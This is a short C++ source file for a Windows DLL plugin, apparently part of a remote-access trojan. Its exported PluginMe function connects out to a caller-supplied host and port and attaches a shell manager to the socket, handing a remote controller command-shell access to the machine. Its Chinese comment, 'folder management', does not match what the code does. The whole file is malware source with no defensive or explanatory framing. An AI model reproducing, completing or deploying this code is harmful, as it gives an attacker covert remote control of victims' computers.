// SHELL.cpp : Defines the entry point for the DLL application.
//

#include "ClientSocket.h"
#include "ShellManager.h"
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(linker, "/ENTRY:_DllMain")
#pragma comment(linker,"/opt:nowin98")

BOOL APIENTRY _DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					   )
{
    return TRUE;
}

//文件夹管理
extern "C" __declspec(dllexport) BOOL PluginMe(LPCTSTR lpszHost, UINT nPort, LPBYTE lparam)     
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	socketClient.run_event_loop();
	
	return 0;
}

